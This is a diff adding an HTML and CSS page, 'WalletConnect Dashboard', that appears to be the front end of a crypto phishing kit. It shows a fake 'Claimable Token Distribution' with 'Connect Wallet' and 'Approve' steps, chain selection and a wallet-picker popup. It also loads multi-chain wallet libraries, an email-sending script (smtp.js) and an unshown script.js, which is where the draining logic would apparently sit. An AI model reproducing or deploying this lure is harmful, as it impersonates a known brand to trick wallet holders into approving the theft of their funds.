@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WalletConnect Dashboard</title>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.9.0/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/tronweb@5.3.2/dist/TronWeb.js"></script>
+  <script src="https://unpkg.com/@tonclient/core@1.45.0/dist/ton-client-web.min.js"></script>
+  <script src="script.js" defer></script>
+  <style>
+   body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #020720, #0a2056);
+      color: white;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('wave.svg'); /* Replace with animated SVG */
+      background-repeat: no-repeat;
+      background-size: cover;
+      opacity: 0.1;
+      animation: waveMove 10s linear infinite;
+      z-index: 0;
+    }
+
+    @keyframes waveMove {
+      0% { background-position: 0 0; }
+      100% { background-position: 100% 0; }
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      max-width: 1200px;
+      margin: auto;
+      padding: 20px;
+    }
+
+    .header-box {
+      background-color: rgba(255, 255, 255, 0.05);
+      padding: 20px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      width: fit-content;
+      margin-bottom: 30px;
+    }
+
+    .header-box img {
+      width: 65px;
+      height: 40px;
+    }
+
+    .title-center {
+      text-align: center;
+      font-size: 1.8em;
+      margin: 40px 0 20px;
+      font-weight: bold;
+    }
+
+    .main {
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 30px;
+    }
+
+    .left, .right {
+      flex: 1;
+      min-width: 300px;
+    }
+
+    .steps-box {
+      background-color: rgba(255, 255, 255, 0.05);
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .steps-box h2 {
+      font-size: 1.5em;
+      margin-bottom: 20px;
+    }
+
+    .step {
+      margin: 10px 0;
+    }
+
+    .step button {
+      background-color: #1e3a8a;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1em;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+
+    .step button:hover {
+      background-color: #2563eb;
+    }
+
+    .arrow {
+      font-size: 1.5em;
+      margin: 10px 0;
+      color: white;
+    }
+
+    .right h2 {
+      font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+
+    .right ul {
+      list-style: none;
+      padding-left: 0;
+    }
+
+    .right li {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+      justify-content: space-between;
+    }
+
+    .right img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+
+    .claim-box {
+      text-align: center;
+      margin: 40px 0 20px;
+    }
+
+    .claim-box button {
+      background-color: #2563eb;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      border-radius: 8px;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(37, 99, 235, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
+    }
+
+    .wallet-logos {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 40px;
+    }
+
+    .wallet-logos img {
+      width: 50px;
+      height: 50px;
+      border-radius: 8px;
+      transition: transform 0.3s ease;
+    }
+
+    .wallet-logos img:hover {
+      transform: scale(1.1);
+    }
+
+    .support {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .support a {
+      margin: 0 10px;
+      display: inline-block;
+    }
+
+    .support img {
+      width: 30px;
+      height: 30px;
+      transition: transform 0.3s ease;
+    }
+
+    .support img:hover {
+      transform: scale(1.2);
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.9em;
+      padding: 10px;
+      border-top: 1px solid white;
+      opacity: 0.7;
+    }
+
+    @media (max-width: 768px) {
+      .main {
+        flex-direction: row;
+        flex-wrap: wrap;
+        align-items: flex-start;
+      }
+
+      .left, .right {
+        flex: 1 1 100%;
+        max-width: 100%;
+      }
+
+      .wallet-logos img {
+        width: 40px;
+        height: 40px;
+      }
+    }
+
+    .main-box {
+  background-color: rgba(255, 255, 255, 0.03);
+  padding: 30px;
+  border-radius: 12px;
+  margin-bottom: 40px;
+}
+
+.realtime-list {
+  list-style: none;
+  padding: 0;
+}
+
+.realtime-list li {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin: 12px 0;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  padding-bottom: 8px;
+}
+
+.realtime-list li span {
+  flex: 1;
+  font-size: 1em;
+}
+
+.realtime-list img {
+  width: 24px;
+  height: 24px;
+  margin-right: 10px;
+}
+
+.wave-background {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 200px;
+  overflow: hidden;
+  z-index: 0;
+  opacity: 0.05;
+  animation: waveMove 10s linear infinite;
+}
+
+.wave-background svg {
+  width: 100%;
+  height: 100%;
+}
+
+@keyframes waveMove {
+  0% { transform: translateX(0); }
+  100% { transform: translateX(-50px); }
+}
+
+.chains-box {
+  background-color: rgba(255, 255, 255, 0.05);
+  padding: 20px;
+  border-radius: 10px;
+  text-align: center;
+  margin-top: 20px;
+}
+
+.chain-options {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 15px;
+  margin-top: 15px;
+}
+
+.chain {
+  background-color: #1e3a8a;
+  color: white;
+  border: none;
+  padding: 10px 15px;
+  border-radius: 8px;
+  font-size: 0.95em;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  transition: background 0.3s ease;
+}
+
+.chain img {
+  width: 20px;
+  height: 20px;
+}
+
+.chain:hover {
+  background-color: #2563eb;
+}
+
+.chain.selected {
+  background-color: #00aaff;
+}
+
+.popup {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(10, 15, 44, 0.95);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 999;
+}
+
+.popup.hidden {
+  display: none;
+}
+
+.popup-content {
+  background-color: #111827;
+  padding: 30px;
+  border-radius: 12px;
+  text-align: center;
+  width: 90%;
+  max-width: 500px;
+}
+
+.popup-content h2 {
+  color: white;
+  margin-bottom: 20px;
+  font-size: 1.5em;
+}
+
+.wallet-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 15px;
+}
+
+.wallet {
+  background-color: #1f2937;
+  color: white;
+  border: none;
+  padding: 10px;
+  border-radius: 10px;
+  font-size: 0.9em;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  cursor: pointer;
+  transition: background 0.3s ease;
+}
+
+.wallet img {
+  width: 40px;
+  height: 40px;
+}
+
+.wallet:hover {
+  background-color: #2563eb;
+}
+  </style>
+</head>
+<body>
+  <div class="wave-background">
+    <svg viewBox="0 0 1200 200" preserveAspectRatio="none">
+      <path d="M0,100 C300,200 900,0 1200,100 L1200,200 L0,200 Z" fill="white" />
+    </svg>
+  </div>
+
+  <div class="container">
+    <div class="header-box">
+      <img src="image/logo.png" alt="Logo" />
+      <div>
+        <h1>WalletConnect</h1>
+        <p>Secured Connection and Smart Protection</p>
+      </div>
+    </div>
+
+    <div class="title-center">Claimable [ Token Distribution ]</div>
+
+    <div class="main-box">
+      <div class="main">
+        <div class="left">
+          <div class="steps-box">
+            <h2>Steps:</h2>
+            <div class="step"><button>Click to Claim</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>Connect Wallet</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>Approve</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>Receive Claimable</button></div>
+          </div>
+        </div>
+
+        <div class="chains-box">
+          <h2>Select Chain</h2>
+          <div class="chain-options">
+            <button class="chain" data-chain="ethereum"><img src="image/eth.png" alt="Ethereum"> Ethereum</button>
+            <button class="chain" data-chain="solana"><img src="image/solana.png" alt="Solana"> Solana</button>
+            <button class="chain" data-chain="polygon"><img src="image/polygon.png" alt="Polygon"> Polygon</button>
+            <button class="chain" data-chain="binance"><img src="image/bsc.png" alt="Binance"> Binance S.</button>
+            <button class="chain" data-chain="ton"><img src="image/ton.png" alt="TON"> TON</button>
+            <button class="chain" data-chain="tron"><img src="image/tron.png" alt="TRON"> TRON</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="claim-box">
+      <button>Claim</button>
+    </div>
+
+    <div class="wallet-logos">
+      <img src="image/IMG_2687.PNG" alt="Tedwoble">
+      <img src="image/onlink.png" alt="Onlink">
+      <img src="image/retsibork.png" alt="Retsibork">
+      <img src="image/retiwiler.png" alt="Retiwiler">
+      <img src="image/cuu.png" alt="Cu">
+      <img src="image/tsr.png" alt="TSR">
+    </div>
+
+    <div class="support">
+      <a href="#"><img src="image/telegram.png" alt="Telegram"></a>
+      <a href="#"><img src="image/discord.png" alt="Discord"></a>
+      <a href="#"><img src="image/website.png" alt="Website"></a>
+    </div>
+
+    <footer>
+      &copy; 2025 WalletConnect. All rights reserved.
+    </footer>
+  </div>
+
+  <div id="wallet-popup" class="popup hidden">
+    <div class="popup-content">
+      <h2>Connect Wallet</h2>
+      <div class="wallet-grid">
+        <button class="wallet"><img src="image/IMG_2687.PNG" alt="Phantom"> Phantom</button>
+        <button class="wallet"><img src="image/retsibork.png" alt="Solflare"> Solflare</button>
+        <button class="wallet"><img src="image/retiwiler.png" alt="MetaMask"> MetaMask</button>
+        <button class="wallet"><img src="image/backpack.png" alt="BackPack"> BackPack</button>
+        <button class="wallet"><img src="image/onlink.png" alt="Trust"> Trust</button>
+        <button class="wallet"><img src="image/tsr.png" alt="Ton Keeper"> Ton Keeper</button>
+        <button class="wallet"><img src="image/coinbase.png" alt="CoinBase"> CoinBase</button>
+        <button class="wallet"><img src="image/cuu.png" alt="Bitget"> Bitget</button>
+        <button class="wallet"><img src="image/glow.png" alt="Glow"> Glow</button>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
